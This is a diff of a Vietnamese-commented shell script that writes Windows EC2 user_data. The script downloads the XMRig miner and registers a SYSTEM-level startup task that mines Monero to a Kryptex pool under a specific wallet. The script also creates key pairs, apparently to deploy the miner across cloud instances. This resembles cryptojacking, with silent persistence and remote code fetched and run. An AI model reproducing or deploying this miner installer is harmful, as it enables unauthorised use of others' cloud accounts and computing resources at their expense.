@@ -28,37 +28,39 @@ create_keypair() {
 }
 
 # Tạo file user_data để khởi động XMRig trên Windows instance
-echo "powershell -NoProfile -ExecutionPolicy Bypass -Command \"& { \\
-    \$workDir = 'C:\\XMRig'; 
-    if (-Not (Test-Path \$workDir)) { 
-        New-Item -ItemType Directory -Path \$workDir | Out-Null 
+cat << 'EOF' > user_data_script.ps1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
+    $workDir = 'C:\\XMRig';
+    if (-Not (Test-Path $workDir)) {
+        New-Item -ItemType Directory -Path $workDir | Out-Null
     }
-    Set-Location -Path \$workDir
-    
+    Set-Location -Path $workDir
+
     # Đường dẫn tải xuống XMRig
-    \$xmrigUrl = 'https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-gcc-win64.zip'
-    \$xmrigZip = '\$workDir\\xmrig-6.22.2.zip'
-    \$xmrigDir = '\$workDir\\xmrig-6.22.2-gcc'
-    
+    $xmrigUrl = 'https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-gcc-win64.zip'
+    $xmrigZip = "$workDir\\xmrig-6.22.2.zip"
+    $xmrigDir = "$workDir\\xmrig-6.22.2-gcc"
+
     # Tải xuống XMRig
-    if (-Not (Test-Path \$xmrigZip)) {
-        Invoke-WebRequest -Uri \$xmrigUrl -OutFile \$xmrigZip
+    if (-Not (Test-Path $xmrigZip)) {
+        Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip
     }
-    
+
     # Giải nén nếu thư mục chưa tồn tại
-    if (-Not (Test-Path \$xmrigDir)) {
-        Expand-Archive -Path \$xmrigZip -DestinationPath \$workDir -Force
+    if (-Not (Test-Path $xmrigDir)) {
+        Expand-Archive -Path $xmrigZip -DestinationPath $workDir -Force
     }
-    
+
     # Thêm vào Task Scheduler để chạy khi hệ thống khởi động
-    \$taskName = 'StartXMRig'
-    \$taskAction = New-ScheduledTaskAction -Execute '\$xmrigDir\\xmrig.exe' -Argument '-o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYZ.myworker -k --coin monero -a rx/0' 
-    \$taskTrigger = New-ScheduledTaskTrigger -AtStartup
-    \$taskPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
-    \$taskSettings = New-ScheduledTaskSettingsSet
-    \$task = New-ScheduledTask -Action \$taskAction -Principal \$taskPrincipal -Trigger \$taskTrigger -Settings \$taskSettings
-    Register-ScheduledTask -TaskName \$taskName -InputObject \$task -Force
-}\" > user_data_script.ps1
+    $taskName = 'StartXMRig'
+    $taskAction = New-ScheduledTaskAction -Execute "$xmrigDir\\xmrig.exe" -Argument "-o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYZ.myworker -k --coin monero -a rx/0"
+    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
+    $taskPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+    $taskSettings = New-ScheduledTaskSettingsSet
+    $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $taskTrigger -Settings $taskSettings
+    Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
+}"
+EOF
 
 user_data_base64=$(base64 -w 0 user_data_script.ps1)
 
